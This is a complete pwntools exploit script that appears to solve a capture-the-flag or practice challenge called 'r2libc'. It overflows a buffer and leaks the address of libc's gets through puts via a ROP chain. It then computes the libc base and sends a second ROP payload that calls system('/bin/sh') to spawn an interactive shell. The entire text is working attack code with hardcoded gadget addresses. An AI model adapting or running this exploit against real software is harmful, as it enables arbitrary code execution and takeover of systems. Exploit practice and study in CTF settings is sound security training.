import pwn
from pwn import *

context.binary = "r2libc"
context.arch = "amd64"
overwrite = b"A"*24

poprdi = p64(0x40120d)
gets_at_got = p64(0x404020)
puts_at_plt = p64(0x401030)
point_main =  p64(0x40116a)


#ret = p64(0x401016)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


payload1 = overwrite + poprdi + gets_at_got + puts_at_plt + point_main

p = process("./r2libc") 
#p = gdb.debug("./r2libc")
p.recvuntil(b"input")
p.sendline(payload1)
p.recvline()
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"{hex(leak)=}")



libc_base = leak - libc.sym["gets"]


ret = p64(0x401016)
system = libc_base + libc.sym["system"]
bin_sh = libc_base + next(libc.search(b"/bin/sh"))
#print(bin_sh)

payload2 = overwrite + ret + poprdi + p64(bin_sh) + p64(system) 
p.sendline(payload2)
p.interactive()
